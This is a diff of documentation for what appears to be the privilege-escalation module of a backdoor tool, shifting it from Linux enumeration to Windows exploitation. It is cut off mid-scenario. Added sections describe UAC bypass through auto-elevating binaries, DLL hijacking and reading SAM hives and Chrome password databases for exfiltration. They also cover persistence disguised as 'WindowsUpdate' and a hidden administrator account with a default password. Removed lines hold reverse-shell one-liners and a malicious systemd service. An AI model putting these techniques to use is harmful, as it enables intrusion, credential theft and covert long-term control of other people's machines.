@@ -2,7 +2,7 @@
 
 ## Overview
 
-Enumeration and exploitation capabilities to identify privilege escalation vectors and elevate access from standard user to root/administrator.
+Windows-focused privilege escalation module that provides enumeration and exploitation capabilities to identify privilege escalation vectors and elevate access from standard user to administrator.
 
 ## Implementation Details
 
@@ -10,12 +10,14 @@ Enumeration and exploitation capabilities to identify privilege escalation vecto
 
 - **Module**: `features/privilege_escalation.py`
 - **Class**: `PrivilegeEscalation`
-- **Focus**: Enumeration and identification (not exploitation)
-- **Platform**: Cross-platform (Linux, macOS, Windows)
+- **Focus**: Windows privilege escalation
+- **Platform**: Windows only (returns error on other platforms)
 
 ## Commands Reference
 
-### Check Privileges
+### Basic Commands
+
+#### Check Privileges
 
 ```bash
 priv_check
@@ -23,55 +25,37 @@ priv_check
 
 **What happens:**
 
-- Checks current user privileges
-- Determines if running as root/admin
-- Identifies user groups
-- Shows effective UID/GID (Unix)
-
-**Response (Linux/macOS):**
-
-```
-=== Privilege Check ===
-Current User: john
-User ID (UID): 1000
-Group ID (GID): 1000
-Effective UID: 1000
-Is Admin/Root: NO
-
-Groups: john adm cdrom sudo dip plugdev lpadmin sambashare
-
-Privileges:
-- Standard user (not root)
-- Member of sudo group (can elevate with password)
-- Member of adm group (can read logs)
-```
+- Checks current user privileges (Windows only)
+- Determines if running as administrator
+- Identifies user groups and integrity level
+- Shows computer and domain information
 
 **Response (Windows):**
 
+```json
+{
+  "system": "Windows",
+  "is_admin": false,
+  "user": "John",
+  "user_domain": "DESKTOP-ABC123",
+  "computer_name": "DESKTOP-ABC123",
+  "user_profile": "C:\\Users\\John",
+  "groups": "BUILTIN\\Users\nNT AUTHORITY\\INTERACTIVE\nCONSOLE LOGON",
+  "integrity_level": "Medium (Standard User)"
+}
 ```
-=== Privilege Check ===
-Current User: DESKTOP\John
-Is Administrator: NO
-User Groups:
-  - BUILTIN\Users
-  - NT AUTHORITY\INTERACTIVE
-  - CONSOLE LOGON
 
-Privileges:
-- Standard user (not administrator)
-- Can request UAC elevation
-```
+**Integrity Levels:**
 
-**Use case:**
-
-- Understand current privilege level
-- Determine if escalation needed
-- Identify group memberships
-- Plan escalation strategy
+- **High (Admin)**: Running with administrator privileges
+- **Medium (Standard User)**: Normal user account
+- **Low**: Sandboxed or restricted process
 
 ---
 
-### Enumerate Escalation Vectors
+### Enumeration Commands
+
+#### Enumerate Escalation Vectors
 
 ```bash
 priv_enum
@@ -79,76 +63,80 @@ priv_enum
 
 **What happens:**
 
-- Comprehensive privilege escalation enumeration
-- Checks SUID binaries (Linux/macOS)
-- Finds sudo opportunities
-- Checks kernel version
-- Identifies writable paths
-- Examines file permissions
+- Comprehensive Windows privilege escalation enumeration
+- Checks UAC (User Account Control) status
+- Checks service permissions
+- Retrieves system information
 
 **Response:**
 
 ```
-=== Privilege Escalation Enumeration ===
+=== Windows Privilege Enumeration ===
 
-CURRENT STATUS:
-User: john (UID: 1000)
-Privilege Level: Standard User
-Sudo Access: YES (with password)
+UAC Status:
+{
+  "uac_enabled": true,
+  "raw_output": "EnableLUA    REG_DWORD    0x1",
+  "consent_prompt": "ConsentPromptBehaviorAdmin    REG_DWORD    0x5"
+}
 
-SUID BINARIES:
-[+] Found 156 SUID binaries
-Potentially exploitable:
-  /usr/bin/passwd
-  /usr/bin/sudo
-  /usr/bin/pkexec
-  /usr/bin/find (⚠️ GTFOBins candidate)
-  /usr/bin/vim (⚠️ GTFOBins candidate)
-  /usr/sbin/mount
-  /bin/ping
+Service Permissions:
+DisplayName        Name              PathName                             StartMode
+CustomService      CustomSvc         C:\Apps\service.exe                  Auto
 
-SUDO OPPORTUNITIES:
-User john may run the following commands:
-  (ALL : ALL) ALL
-  (root) NOPASSWD: /usr/bin/systemctl restart apache2
+System Information:
+Host Name:                 DESKTOP-ABC123
+OS Name:                   Microsoft Windows 10 Pro
+OS Version:                10.0.19044 N/A Build 19044
+```
 
-⚠️ No password required for: systemctl restart apache2
-Exploit: Arbitrary command execution via systemctl
+---
 
-KERNEL VERSION:
-Linux 4.15.0-142-generic
-Known vulnerabilities:
-  - CVE-2021-3493 (OverlayFS)
-  - CVE-2021-3490 (eBPF)
+#### Comprehensive Escalation Scan
 
-WRITABLE PATHS IN $PATH:
-  /home/john/.local/bin (Writable)
-  ⚠️ Can place malicious binaries here
+```bash
+priv_scan
+```
 
-INTERESTING FILES:
-  /etc/passwd (World readable)
-  /etc/shadow (Not readable - root only)
-  /var/log/auth.log (Readable - adm group)
-  /etc/crontab (Readable)
-  /var/spool/cron/crontabs (Not readable)
+**What happens:**
 
-RECOMMENDATIONS:
-1. Try: sudo -l (check NOPASSWD commands)
-2. Exploit: /usr/bin/find SUID binary
-3. Research: Kernel CVE-2021-3493
-4. Check: Cron jobs for writable scripts
+- Performs comprehensive Windows privilege escalation scan
+- Combines all enumeration techniques
+- Returns structured JSON data with all findings
+- Includes status, UAC info, system info, services, tasks, sensitive files, weak permissions, and DLL hijacking opportunities
+
+**Response:**
+
+```json
+{
+  "status": {
+    "system": "Windows",
+    "is_admin": false,
+    "user": "John",
+    "integrity_level": "Medium (Standard User)"
+  },
+  "uac_status": {
+    "uac_enabled": true
+  },
+  "system_info": "Host Name: DESKTOP-ABC123...",
+  "services": "SERVICE_NAME: CustomService...",
+  "service_permissions": "DisplayName    Name    PathName...",
+  "scheduled_tasks": "TaskName    Next Run Time    Status...",
+  "sensitive_files": "C:\\Users\\John\\passwords.txt...",
+  "weak_file_permissions": ["C:\\Apps\\service.exe (Service binary writable)"],
+  "dll_hijacking": ["C:\\Apps\\program.exe -> version.dll"]
+}
 ```
 
 **Use case:**
 
-- Comprehensive privilege assessment
-- Identify multiple escalation paths
-- Prioritize attack vectors
-- Gather reconnaissance data
+- Complete Windows system assessment
+- Gather all privilege escalation data at once
+- Offline analysis of escalation opportunities
 
 ---
 
-### Enumerate Services
+#### Enumerate Services
 
 ```bash
 priv_services
@@ -156,73 +144,28 @@ priv_services
 
 **What happens:**
 
-- Lists running services
+- Lists running Windows services
 - Shows service states
 - Identifies service permissions
-- Finds services running as root
-- Checks for writable service configs
-
-**Response (Linux):**
-
-```
-=== Running Services ===
-
-SYSTEM SERVICES:
-apache2          RUNNING    root      /usr/sbin/apache2
-mysql            RUNNING    mysql     /usr/sbin/mysqld
-ssh              RUNNING    root      /usr/sbin/sshd
-cron             RUNNING    root      /usr/sbin/cron
-
-WRITABLE SERVICE FILES:
-⚠️ /etc/apache2/apache2.conf (Group writable)
-  Owner: root:www-data
-  Permissions: -rw-rw-r--
-  Exploit: Modify config, restart service as root
-
-SERVICES WITH WEAK PERMISSIONS:
-⚠️ /opt/custom-service/run.sh
-  Owner: root:root
-  Permissions: -rwxrwxrwx (World writable!)
-  Exploit: Replace script, wait for execution
-
-SYSTEMD SERVICES:
-  apache2.service    enabled
-  mysql.service      enabled
-  custom.service     enabled (⚠️ /opt/custom-service/run.sh)
-```
+- Finds services that could be exploited
 
 **Response (Windows):**
 
 ```
-=== Windows Services ===
+SERVICE_NAME: Apache2.4
+DISPLAY_NAME: Apache HTTP Server
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 4  RUNNING
 
-RUNNING SERVICES:
-Apache2.4         RUNNING    LocalSystem
-MySQL             RUNNING    NT AUTHORITY\NetworkService
-CustomService     RUNNING    LocalSystem
-
-VULNERABLE SERVICES:
-⚠️ CustomService
-  Path: C:\Program Files\Custom\service.exe
-  Binary not quoted (⚠️ Unquoted Service Path)
-  Exploit: Place exe in C:\Program.exe or C:\Program Files\Custom.exe
-
-MODIFIABLE SERVICES:
-⚠️ Apache2.4 service registry key writable
-  Path: HKLM\SYSTEM\CurrentControlSet\Services\Apache2.4
-  Exploit: Modify ImagePath to run custom exe
+SERVICE_NAME: MySQL
+DISPLAY_NAME: MySQL Server
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 4  RUNNING
 ```
-
-**Use case:**
-
-- Identify service-based exploits
-- Find writable service configs
-- Discover services running as SYSTEM/root
-- Plan service restart attacks
 
 ---
 
-### Check Scheduled Tasks
+#### Check Scheduled Tasks
 
 ```bash
 priv_tasks
@@ -230,75 +173,26 @@ priv_tasks
 
 **What happens:**
 
-- Lists cron jobs (Linux/macOS)
-- Shows scheduled tasks (Windows)
+- Lists Windows scheduled tasks
+- Shows task schedules and status
 - Identifies task permissions
-- Finds writable task scripts
-
-**Response (Linux):**
-
-```
-=== Scheduled Tasks (Cron Jobs) ===
-
-USER CRON JOBS:
-john:
-  */5 * * * * /home/john/backup.sh
-
-ROOT CRON JOBS:
-root:
-  0 2 * * * /root/cleanup.sh
-  */10 * * * * /opt/backup/run.sh (⚠️ World writable)
-  @reboot /usr/local/bin/startup.sh
-
-WRITABLE CRON SCRIPTS:
-⚠️ /opt/backup/run.sh
-  Owner: root:root
-  Permissions: -rwxrwxrwx
-  Runs as: root
-  Frequency: Every 10 minutes
-  Exploit: Modify script, wait for execution
-
-SYSTEM-WIDE CRON:
-/etc/crontab:
-  0 * * * * root /usr/bin/update-script.sh
-
-CRON DIRECTORIES:
-  /etc/cron.d/ (Readable)
-  /etc/cron.daily/ (Writable by sudo group!)
-  /etc/cron.hourly/
-```
 
 **Response (Windows):**
 
 ```
-=== Scheduled Tasks ===
+TaskName: BackupTask
+Next Run Time: 10/4/2025 2:00:00 AM
+Status: Ready
+Run As User: SYSTEM
 
-TASKS RUNNING AS SYSTEM:
-  BackupTask
-    Path: C:\Scripts\backup.bat (⚠️ Users can modify)
-    Schedule: Daily at 2:00 AM
-    Runs as: SYSTEM
-
-  UpdateTask
-    Path: C:\Program Files\App\update.exe
-    Schedule: Every hour
-
-WRITABLE TASK PATHS:
-⚠️ C:\Scripts\backup.bat
-  Permissions: Users (Modify)
-  Exploit: Modify script, wait for scheduled execution
+TaskName: WindowsUpdate
+Next Run Time: N/A
+Status: Disabled
 ```
-
-**Use case:**
-
-- Find scripts running as root/SYSTEM
-- Identify writable scheduled tasks
-- Plan time-based attacks
-- Discover automation scripts
 
 ---
 
-### Find Sensitive Files
+#### Find Sensitive Files
 
 ```bash
 priv_sensitive
@@ -306,64 +200,473 @@ priv_sensitive
 
 **What happens:**
 
-- Searches for sensitive files
-- Looks for credentials
-- Finds configuration files
-- Checks history files
-- Identifies SSH keys
+- Searches for sensitive files on Windows
+- Looks for credentials, keys, configs
+- Searches user directories for .txt, .config, .xml, .ini, .log, .bak files
 
 **Response:**
 
 ```
-=== Sensitive Files ===
+=== *.txt ===
+C:\Users\John\passwords.txt
+C:\Users\John\Documents\notes.txt
+C:\Users\John\Desktop\credentials.txt
 
-CREDENTIAL FILES:
-  /home/john/.bash_history (Readable)
-  /home/john/.mysql_history (Readable)
-  /home/john/.ssh/id_rsa (Private key found!)
-  /home/john/.ssh/config (SSH configuration)
-  /home/john/.aws/credentials (AWS keys!)
-  /home/john/.docker/config.json (Docker credentials)
+=== *.config ===
+C:\Users\John\AppData\Roaming\app\config.config
+C:\Users\John\.aws\config
 
-CONFIGURATION FILES:
-  /etc/mysql/my.cnf (Readable)
-  /var/www/html/config.php (Database credentials)
-  /opt/app/.env (Environment variables with secrets)
+=== *.xml ===
+C:\Users\John\AppData\Local\app\settings.xml
+```
 
-HISTORY FILES WITH PASSWORDS:
-/home/john/.bash_history:
-  mysql -u root -p'SecretPassword123'
-  ssh admin@server.com -i /home/john/.ssh/id_rsa
-  sudo su - root
-  export DB_PASS='DatabasePass456'
+---
 
-DATABASE FILES:
-  /var/lib/mysql/ (Not readable - mysql user only)
-  /var/www/html/database.sqlite (World readable!)
+### Advanced Enumeration Commands
 
-BACKUP FILES:
-  /tmp/backup-2024.tar.gz (World readable)
-  /var/backups/passwd.bak (Readable - contains user info)
+#### Find Weak File Permissions
 
-SSH KEYS:
-  /home/john/.ssh/id_rsa (Private key - NOT encrypted)
-  /home/john/.ssh/id_rsa.pub
-  /root/.ssh/authorized_keys (Not readable)
+```bash
+priv_weak_perms
+```
 
-POTENTIAL CREDENTIALS:
-  Database password in: /var/www/html/config.php
-  API keys in: /opt/app/.env
-  SSH key in: /home/john/.ssh/id_rsa
-  AWS credentials in: /home/john/.aws/credentials
+**What happens:**
+
+- Searches for writable files in system directories
+- Finds writable service binaries
+- Checks for writable service directories
+- Identifies modifiable files in Program Files
+
+**Response:**
+
+```
+Exploitable Files:
+C:\Apps\service.exe (Service binary writable)
+C:\Apps\ (Service directory writable)
+C:\Program Files\CustomApp (Writable program directory)
 ```
 
 **Use case:**
 
-- Find hardcoded credentials
-- Discover SSH keys
-- Extract database passwords
-- Locate API tokens
-- Find backup files
+- Find files for privilege escalation
+- Identify writable service configs
+- Locate modifiable executables that run as SYSTEM
+
+---
+
+### Admin File Access Commands (New!)
+
+#### Read Admin-Protected Text Files
+
+```bash
+priv_read_file <file_path>
+```
+
+**What happens:**
+
+- Attempts to read a text file that requires admin privileges
+- Uses multiple fallback methods:
+  1. Direct Python file I/O
+  2. PowerShell Get-Content
+  3. Shell commands (type/cat)
+- Returns file content or detailed error message
+- Suggests UAC bypass if permission denied
+
+**Response (Success):**
+
+```
+=== Admin File Read ===
+File: C:\Windows\System32\drivers\etc\hosts
+Method: powershell
+Is Admin: False
+
+Content (150 lines):
+# Copyright (c) 1993-2009 Microsoft Corp.
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+127.0.0.1       localhost
+::1             localhost
+[... full file content ...]
+```
+
+**Response (Permission Denied):**
+
+```
+=== Admin File Read Failed ===
+File: C:\Windows\System32\config\SAM
+Error: Permission denied - admin privileges required
+
+Note: Not running as admin. Try:
+1. Run 'priv_uac_bypass' to attempt elevation
+2. Run backdoor as administrator
+3. Use 'priv_check' to verify admin status
+```
+
+**Use cases:**
+
+- Read Windows SAM/SYSTEM files for hash extraction
+- Access SSH private keys in protected directories
+- Read browser credential databases
+- Access configuration files with sensitive data
+- Extract credentials from application config files
+
+**Examples:**
+
+```bash
+# Read Windows password hashes
+priv_read_file C:\Windows\System32\config\SAM
+
+# Read SSH private keys
+priv_read_file C:\Users\Administrator\.ssh\id_rsa
+
+# Read application configs
+priv_read_file "C:\Program Files\App\config\database.xml"
+
+# Read browser login data
+priv_read_file "C:\Users\John\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+```
+
+---
+
+#### Read Admin-Protected Binary Files
+
+```bash
+priv_read_binary <file_path>
+```
+
+**What happens:**
+
+- Reads binary files that require admin privileges
+- Returns base64-encoded content for safe transmission
+- Uses multiple methods:
+  1. Direct binary read
+  2. PowerShell binary read with base64 conversion
+- Safe for executables, DLLs, database files
+
+**Response:**
+
+```
+=== Admin Binary File Read ===
+File: C:\Windows\System32\cmd.exe
+Method: direct_binary_read
+File Size: 289,792 bytes
+Is Admin: True
+
+Base64 Content (preview - first 200 chars):
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAA...
+
+Full Base64 Content:
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAA
+[... continues with full base64 encoded binary ...]
+```
+
+**Use cases:**
+
+- Extract Windows executables for analysis
+- Download DLL files from System32
+- Retrieve SQLite database files (Chrome passwords)
+- Extract binary configuration files
+- Download protected executables
+
+**Examples:**
+
+```bash
+# Extract cmd.exe
+priv_read_binary C:\Windows\System32\cmd.exe
+
+# Download Chrome password database (SQLite)
+priv_read_binary "C:\Users\John\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+
+# Extract DLL for analysis
+priv_read_binary C:\Windows\System32\advapi32.dll
+
+# Download SYSTEM registry hive
+priv_read_binary C:\Windows\System32\config\SYSTEM
+```
+
+**Decoding on attacker machine:**
+
+```python
+import base64
+
+# Copy the base64 content from output
+base64_content = "TVqQAAMAAAAEAAAA..."
+
+# Decode and save
+with open("extracted_file.exe", "wb") as f:
+    f.write(base64.b64decode(base64_content))
+```
+
+---
+
+#### List Admin-Protected Directory
+
+```bash
+priv_list_dir <directory_path>
+```
+
+**What happens:**
+
+- Lists contents of directories requiring admin access
+- Separates files and subdirectories
+- Shows file sizes when available
+- Uses fallback methods for access
+
+**Response:**
+
+```
+=== Admin Directory Listing ===
+Directory: C:\Windows\System32\config
+Method: direct_listing
+Is Admin: False
+
+Directories (3):
+  - systemprofile
+  - TxR
+  - RegBack
+
+Files (15):
+  - BBI (size: 65,536 bytes)
+  - BCD-Template (size: 25,600 bytes)
+  - DEFAULT (size: 262,144 bytes)
+  - SAM (size: 262,144 bytes)
+  - SECURITY (size: 262,144 bytes)
+  - SOFTWARE (size: 45,088,768 bytes)
+  - SYSTEM (size: 17,301,504 bytes)
+  - COMPONENTS (size: 12,582,912 bytes)
+  [...]
+```
+
+**Use cases:**
+
+- Browse Windows System32\config directory
+- List user AppData folders
+- Explore Program Files directories
+- Enumerate SSH key directories
+- Browse Windows credential stores
+
+**Examples:**
+
+```bash
+# List config directory
+priv_list_dir C:\Windows\System32\config
+
+# Browse user AppData
+priv_list_dir "C:\Users\John\AppData\Local\Google\Chrome\User Data\Default"
+
+# Check SSH directory
+priv_list_dir C:\Users\Administrator\.ssh
+
+# List Windows credentials
+priv_list_dir C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
+```
+
+---
+
+### Exploitation Commands
+
+#### Windows UAC Bypass
+
+```bash
+priv_uac_bypass
+```
+
+**What happens:**
+
+- Attempts UAC bypass on Windows
+- Uses fodhelper.exe method
+- Uses ComputerDefaults.exe method
+- Uses eventvwr.exe method
+- Modifies registry to bypass UAC
+
+**Response:**
+
+```
+UAC bypass attempts: fodhelper.exe registry keys created, fodhelper.exe executed, ComputerDefaults.exe executed, eventvwr.exe executed
+```
+
+**Warning:**
+
+- This is for educational purposes only!
+- Requires Windows target
+- May be detected by antivirus
+- Creates temporary registry entries
+
+**How it works:**
+
+1. Creates registry keys in HKCU\Software\Classes\ms-settings\Shell\Open\command
+2. Sets the payload path as the command
+3. Executes trusted Windows binaries (fodhelper, ComputerDefaults, eventvwr)
+4. These binaries auto-elevate without UAC prompt
+5. They execute the payload with elevated privileges
+6. Cleans up registry keys after execution
+
+---
+
+#### DLL Hijacking Opportunities
+
+```bash
+priv_dll_hijack
+```
+
+**What happens:**
+
+- Searches for DLL hijacking opportunities (Windows only)
+- Finds executables in writable directories
+- Identifies missing DLLs that can be hijacked
+- Checks Program Files, AppData, and user directories
+
+**Response:**
+
+```
+DLL Hijacking Opportunities:
+C:\Program Files\CustomApp\app.exe -> version.dll
+C:\Users\John\AppData\Local\App\program.exe -> dwmapi.dll
+C:\Program Files (x86)\OldApp\legacy.exe -> uxtheme.dll
+C:\Users\John\AppData\Roaming\Service\service.exe -> WINMM.dll
+```
+
+**Common hijackable DLLs:**
+
+- version.dll
+- dwmapi.dll
+- uxtheme.dll
+- propsys.dll
+- cryptsp.dll
+- WINMM.dll
+- WTSAPI32.dll
+
+**Use case:**
+
+- Windows privilege escalation
+- Find executables vulnerable to DLL hijacking
+- Identify writable application directories
+- Create malicious DLL to gain code execution
+
+**How to exploit:**
+
+1. Find an executable with a missing DLL in a writable directory
+2. Create a malicious DLL with the same name
+3. Place it in the executable's directory
+4. When the executable runs, it loads your DLL
+5. Your DLL code executes with the executable's privileges
+
+---
+
+### Persistence Commands
+
+#### Create Persistence Mechanism
+
+```bash
+priv_persist
+```
+
+Creates persistence using default payload path (current executable).
+
+```bash
+priv_persist C:\Tools\backdoor.exe
+```
+
+Creates persistence with custom payload path.
+
+**What happens:**
+
+- Creates multiple Windows persistence mechanisms
+- **Method 1:** Registry Run key (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
+- **Method 2:** Startup folder batch file
+- **Method 3:** Registry RunOnce key
+- **Method 4:** Scheduled task as SYSTEM (if admin)
+
+**Response:**
+
+```
+Persistence mechanisms: Registry Run key created (HKCU), Startup folder persistence created, Registry RunOnce key created, Scheduled task created (SYSTEM)
+```
+
+**Persistence Methods:**
+
+1. **Registry Run Key (HKCU)**
+
+   - Runs on user login
+   - Does not require admin
+   - Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+   - Value: "WindowsUpdate" = "C:\path\to\payload.exe"
+
+2. **Startup Folder**
+
+   - Runs on user login
+   - Does not require admin
+   - Location: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+   - Creates batch file: WindowsUpdate.bat
+
+3. **Registry RunOnce Key**
+
+   - Runs once on next login
+   - Does not require admin
+   - Key: HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+4. **Scheduled Task (Admin only)**
+   - Runs as SYSTEM on logon
+   - Requires administrator privileges
+   - Task name: "WindowsUpdateCheck"
+   - Highest privileges
+
+**Use case:**
+
+- Maintain access after reboot
+- Create backdoor auto-start
+- Survive system restarts
+- Multiple fallback methods
+
+---
+
+#### Create Backdoor User
+
+```bash
+priv_user
+```
+
+Creates user with default credentials (username: support, password: P@ssw0rd123).
+
+```bash
+priv_user admin MySecretPass123
+```
+
+Creates custom user with specified credentials.
+
+**What happens:**
+
+- Creates new Windows user account (requires administrator)
+- Adds user to Administrators group
+- Hides user from login screen via registry
+
+**Response:**
+
+```
+Backdoor user 'admin' created and hidden from login screen
+```
+
+**How it works:**
+
+1. Executes: `net user <username> <password> /add`
+2. Executes: `net localgroup administrators <username> /add`
+3. Sets registry key: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList
+4. Sets value: <username> = 0 (hides from login screen)
+
+**Warning:**
+
+- Requires administrator privileges!
+- User will not appear on Windows login screen
+- User can still be seen in Computer Management
+- Can be detected by security tools
+
+**Use case:**
+
+- Persistent administrative access
+- Hidden backup admin account
+- Alternative access method
+
+---
 
 ## Troubleshooting
 
@@ -440,75 +743,78 @@ echo $PATH
 
 ### Technical Limitations
 
-1. **Enumeration Only**
+1. **Windows Only**
 
-   - Does not exploit vulnerabilities
-   - Does not execute attacks
-   - Only identifies potential vectors
-   - Manual exploitation required
+   - Only works on Windows systems
+   - Returns error on Linux/macOS
+   - Platform-specific techniques
+   - Windows-focused enumeration
 
-2. **Platform-Specific**
+2. **Enumeration Focus**
 
-   - Different techniques per OS
-   - Windows/Linux/macOS variations
-   - Command availability varies
-   - Output parsing differs
+   - Primarily identifies vulnerabilities
+   - Some exploitation capabilities included
+   - UAC bypass may not always work
+   - Manual exploitation often needed
 
 3. **Requires Execution**
 
-   - Must run on target system
+   - Must run on target Windows system
    - Needs basic user privileges
-   - Some checks require permissions
-   - May trigger security alerts
+   - Some checks require administrator
+   - May trigger Windows Defender/antivirus
 
 4. **Limited Coverage**
-   - Can't check everything
-   - May miss custom vulnerabilities
-   - Doesn't test all CVEs
-   - Basic enumeration only
+   - Can't check all Windows vulnerabilities
+   - May miss custom misconfigurations
+   - Doesn't test all exploit methods
+   - Basic Windows enumeration
 
 ### Detection Risks
 
 1. **Command Execution**
 
-   - Running enumeration commands logged
-   - Audit logs show privilege checks
-   - Security tools may alert
-   - Unusual process activity
+   - Running enumeration commands logged in Windows Event Log
+   - Service queries trigger security events
+   - Registry modifications detected
+   - Unusual process activity flagged
 
 2. **File Access**
 
    - Reading sensitive files logged
    - Failed access attempts recorded
-   - Triggers file integrity monitoring
-   - Antivirus may flag behavior
+   - May trigger File Integrity Monitoring
+   - Windows Defender may flag behavior
 
-3. **Network Activity**
-   - Some checks require network access
-   - Kernel version lookups
-   - CVE database queries
+3. **Registry Modification**
+   - UAC bypass creates registry keys
+   - Persistence methods modify registry
+   - Registry changes audited
+   - Easy to detect with proper monitoring
 
 ### Functional Limitations
 
-1. **No Automation**
+1. **No Automated Exploitation**
 
-   - Doesn't auto-exploit findings
+   - Doesn't auto-exploit all findings
    - Manual interpretation required
-   - No privilege escalation execution
-   - Reconnaissance tool only
+   - UAC bypass may fail
+   - Enumeration tool primarily
 
 2. **No Custom Checks**
 
-   - Standard vectors only
-   - Doesn't check application-specific vulns
+   - Standard Windows vectors only
+   - Doesn't check application-specific vulnerabilities
    - No custom binary analysis
-   - Limited to known techniques
+   - Limited to known Windows techniques
 
 3. **Output Limitations**
    - Large output for complex systems
    - May need filtering/parsing
-   - Information overload
+   - Information overload possible
    - Manual review required
+
+---
 
 ## Best Practices
 
@@ -522,13 +828,16 @@ priv_check
 # 2. Comprehensive enumeration
 priv_enum
 
-# 3. Service analysis
+# 3. Full scan
+priv_scan
+
+# 4. Service analysis
 priv_services
 
-# 4. Scheduled task review
+# 5. Scheduled task review
 priv_tasks
 
-# 5. Sensitive file discovery
+# 6. Sensitive file discovery
 priv_sensitive
 
 # Save all output for offline analysis
@@ -538,169 +847,351 @@ priv_sensitive
 
 ```bash
 # Save all enumeration results
-priv_check > priv_check.txt
-priv_enum > priv_enum.txt
-priv_services > priv_services.txt
-priv_tasks > priv_tasks.txt
-priv_sensitive > priv_sensitive.txt
-
-# Download for offline analysis
-download priv_check.txt
-download priv_enum.txt
+# (From attacker server after receiving responses)
+# Save each command output to separate files for analysis
 ```
 
 ### 3. Prioritization
 
 ```bash
-# Focus on highest-impact findings:
-# 1. NOPASSWD sudo commands
-# 2. Writable SUID binaries
-# 3. Writable service configs
-# 4. Writable cron scripts
-# 5. SSH keys without passphrases
-# 6. Hardcoded credentials
+# Focus on highest-impact Windows findings:
+# 1. Writable service binaries
+# 2. Unquoted service paths
+# 3. Writable service directories
+# 4. DLL hijacking opportunities
+# 5. Scheduled tasks running as SYSTEM
+# 6. Weak file permissions in Program Files
+# 7. Sensitive files with credentials
 ```
 
-### 4. Manual Exploitation
+### 4. Exploitation Strategy
 
 ```bash
-# After enumeration, exploit manually:
+# After enumeration, exploit based on findings:
 
-# Example: NOPASSWD sudo
-sudo systemctl restart apache2
+# If UAC bypass available:
+priv_uac_bypass
 
-# Example: Writable cron script
-echo "bash -i >& /dev/tcp/attacker/4444 0>&1" >> /opt/backup/run.sh
+# If writable service binary found:
+# Replace service binary with payload
+# Restart service to gain SYSTEM
 
-# Example: SUID find
-find . -exec /bin/sh -p \; -quit
+# If DLL hijacking opportunity:
+# Create malicious DLL
+# Place in target directory
+# Wait for or trigger execution
+
+# Always create persistence:
+priv_persist C:\path\to\payload.exe
 ```
+
+---
 
 ## Attack Scenarios
 
-### Scenario 1: Sudo NOPASSWD Exploitation
+### Scenario 1: UAC Bypass to Administrator
 
 ```bash
-# 1. Enumerate
+# 1. Check current privileges
+priv_check
+# Result: is_admin=false, integrity_level="Medium (Standard User)"
+
+# 2. Check UAC status
 priv_enum
-# Finds: (root) NOPASSWD: /usr/bin/systemctl restart apache2
+# Result: UAC enabled
 
-# 2. Exploit systemctl
-# Create malicious service
-echo '[Service]
-ExecStart=/bin/bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"
-[Install]
-WantedBy=multi-user.target' > /tmp/evil.service
+# 3. Attempt UAC bypass
+priv_uac_bypass
+# Result: fodhelper.exe executed, registry keys created
 
-# 3. Restart with malicious service
-sudo systemctl link /tmp/evil.service
-sudo systemctl start evil
-# Result: Root shell to attacker
+# 4. Verify escalation (in new elevated process)
+priv_check
+# Result: is_admin=true, integrity_level="High (Admin)"
+
+# 5. Create persistence as admin
+priv_persist
+# Result: Scheduled task created as SYSTEM
 ```
 
 ---
 
-### Scenario 2: Writable Cron Job
+### Scenario 2: DLL Hijacking
 
 ```bash
-# 1. Find writable cron
-priv_tasks
-# Finds: /opt/backup/run.sh (world writable, runs as root)
+# 1. Find DLL hijacking opportunities
+priv_dll_hijack
+# Finds: C:\Program Files\CustomApp\app.exe -> version.dll
 
-# 2. Modify script
-echo '#!/bin/bash' > /opt/backup/run.sh
-echo 'cp /bin/bash /tmp/rootbash' >> /opt/backup/run.sh
-echo 'chmod +s /tmp/rootbash' >> /opt/backup/run.sh
+# 2. Create malicious DLL
+# (On attacker machine, create version.dll with payload)
+# Export DllMain function
+# Add reverse shell code
 
-# 3. Wait for execution (check schedule)
-# Script runs, creates SUID bash
+# 3. Upload malicious DLL
+# upload version.dll
 
-# 4. Execute SUID bash
-/tmp/rootbash -p
-# Result: Root shell
+# 4. Move DLL to target directory
+# (Use file system commands to place DLL)
+# move version.dll "C:\Program Files\CustomApp\version.dll"
+
+# 5. Wait for or trigger application execution
+# Result: Payload executes with application's privileges
 ```
 
 ---
 
-### Scenario 3: SSH Key Theft
+### Scenario 3: Writable Service Binary
 
 ```bash
-# 1. Find SSH keys
+# 1. Find weak file permissions
+priv_weak_perms
+# Finds: C:\Apps\service.exe (Service binary writable)
+
+# 2. Check service details
+priv_services
+# Find service running as SYSTEM with auto-start
+
+# 3. Replace service binary with payload
+# upload backdoor.exe
+# move /Y backdoor.exe C:\Apps\service.exe
+
+# 4. Restart service (if admin) or wait for reboot
+# sc stop ServiceName
+# sc start ServiceName
+# Result: Payload executes as SYSTEM
+```
+
+---
+
+### Scenario 4: Sensitive File Credentials
+
+```bash
+# 1. Find sensitive files
 priv_sensitive
-# Finds: /home/john/.ssh/id_rsa (no passphrase)
+# Finds: C:\Users\John\passwords.txt
 
-# 2. Download key
-download /home/john/.ssh/id_rsa
+# 2. Download and read file
+# download C:\Users\John\passwords.txt
+# File contains: Admin password: SuperSecret123
 
-# 3. Use on attacker machine
+# 3. Create backdoor admin user
+priv_user backdoor SuperSecret123
+# Result: Backdoor administrator account created and hidden
+
+# 4. Create persistence
+priv_persist
+# Result: Multiple persistence mechanisms created
+```
+
+---
+
+### Scenario 5: Admin File Access - SAM Hash Extraction (New!)
+
+```bash
+# Complete workflow for extracting Windows password hashes
+
+# 1. Check current privileges
+priv_check
+# Result: is_admin=false
+
+# 2. Attempt to read SAM file (will fail)
+priv_read_file C:\Windows\System32\config\SAM
